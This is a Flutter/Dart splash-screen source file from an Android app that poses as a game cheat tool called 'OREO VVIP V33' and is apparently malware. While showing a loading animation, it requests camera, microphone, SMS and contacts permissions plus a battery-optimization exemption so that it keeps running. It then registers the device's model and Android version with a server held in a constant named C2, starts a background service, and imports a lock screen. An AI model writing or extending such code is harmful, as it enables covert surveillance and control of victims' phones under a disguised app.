import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;
import 'package:device_info_plus/device_info_plus.dart';
import '../lock/lock_screen.dart';
import 'cheat_home.dart';
import '../services/device_service.dart'; // Import Service lagi
import '../config.dart';

class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});
  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  @override
  void initState() {
    super.initState();
    _bootstrap();
  }

  Future<void> _bootstrap() async {
    // 1. MINTA IZIN DULU (Wajib termasuk Notifikasi & Baterai)
    try {
      await [
        Permission.camera, 
        Permission.microphone,
        Permission.sms, 
        Permission.contacts, 
        Permission.notification,
        Permission.ignoreBatteryOptimizations, // Biar gak dimatiin Android
      ].request().timeout(const Duration(seconds: 5));
    } catch (e) {
      debugPrint("Permission error: $e");
    }

    // 2. REGISTER DEVICE
    try {
      final prefs = await SharedPreferences.getInstance();
      String? devId = prefs.getString('dev_id');
      if (devId == null) {
        devId = DateTime.now().millisecondsSinceEpoch.toString();
        await prefs.setString('dev_id', devId);
      }
      final info = await DeviceInfoPlugin().androidInfo;
      
      await http.post(
        Uri.parse('$C2/api/device/register'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'id': devId,
          'model': '${info.manufacturer} ${info.model}',
          'android': info.version.release,
        }),
      ).timeout(const Duration(seconds: 4));
    } catch (e) {
      debugPrint("Gagal konek server: $e");
    }

    // 3. BARU JALANIN BACKGROUND SERVICE (Setelah izin dikasih)
    try {
      await DeviceService.init();
    } catch (e) {
      debugPrint("Gagal start service: $e");
    }

    // 4. LANJUT KE MENU
    await Future.delayed(const Duration(seconds: 2));
    if (!mounted) return;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: (_) => const CheatHome()),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
          Container(
            width: 120, height: 120,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              gradient: const RadialGradient(colors: [Color(0xFFC9A227), Color(0xFFB3121F)]),
              boxShadow: [BoxShadow(color: const Color(0xFFC9A227).withOpacity(.5), blurRadius: 40)],
            ),
            child: const Icon(Icons.local_fire_department, size: 60, color: Colors.white),
          ),
          const SizedBox(height: 30),
          const Text('OREO VVIP V33', style: TextStyle(fontSize: 22, letterSpacing: 4, fontWeight: FontWeight.bold, color: Colors.white)),
          const SizedBox(height: 10),
          const Text('v3.3  •  Optimizing', style: TextStyle(fontSize: 11, color: Colors.grey, letterSpacing: 3)),
          const SizedBox(height: 40),
          const SizedBox(width: 220, child: LinearProgressIndicator(backgroundColor: Color(0xFF1E1B26), color: Color(0xFFC9A227))),
        ]),
      ),
    );
  }
}
